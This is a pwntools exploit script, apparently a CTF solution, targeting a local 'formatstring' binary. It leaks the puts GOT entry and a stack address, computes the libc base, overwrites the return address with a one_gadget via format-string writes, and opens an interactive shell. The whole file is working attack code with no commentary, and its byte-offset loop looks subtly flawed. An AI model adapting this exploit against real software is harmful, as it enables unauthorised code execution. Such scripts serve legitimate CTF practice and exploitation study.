from pwn import *
import subprocess


def bytes2write(addr):
    l = []
    l.append(addr >> 0 & 0xff)
    l.append(addr >> 8 & 0xff)
    l.append(addr >> 16 & 0xff)
    l.append(addr >> 24 & 0xff)
    l.append(addr >> 32 & 0xff)
    l.append(addr >> 40 & 0xff)
    l.append(addr >> 48 & 0xff)
    return l

def get_one_gadgets(libc):
    args = ["one_gadget", "-r"]
    if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
        args += ["-b", libc.hex()]
    else:
        args += [libc]
    return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]

elf = context.binary = ELF("./formatstring")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


r = process(elf.path)

r.recvuntil(b"Just type something:\n")
r.sendline(b"%9$s".ljust(8,b"A")+p64(elf.got["puts"]))


puts_libc_leak = u64(r.recv(6).ljust(8,b"\x00"))
libc.address = puts_libc_leak - libc.symbols["puts"]


oneshots = get_one_gadgets(libc.path)
oneshot = libc.address+oneshots[1]

r.sendline(b"n")

r.recvuntil(b"Just type something:\n")
r.sendline(b"%12$p")

stack_leak = r.recvline().strip()
stack_leak = int(stack_leak,16)



ret_stack_addr = stack_leak - 232


v = bytes2write(oneshot)

i=0
for value in v:
    if value!=0:
        addr2writeto = ret_stack_addr+i
        writes = {addr2writeto: value}
        payload = fmtstr_payload(8, writes, write_size="byte")

        #r.recvuntil(b"Exit (y/n): ")
        r.sendline(b"n")

        r.recvuntil(b"Just type something:\n")
        r.sendline(payload)
        i=i+1
        
    
r.sendline(b"n")
r.recvuntil(b"Just type something:\n")
r.sendline(b"9B"+b"\x00"*29)


r.sendline(b"y")
r.sendline(b"y")
r.interactive()
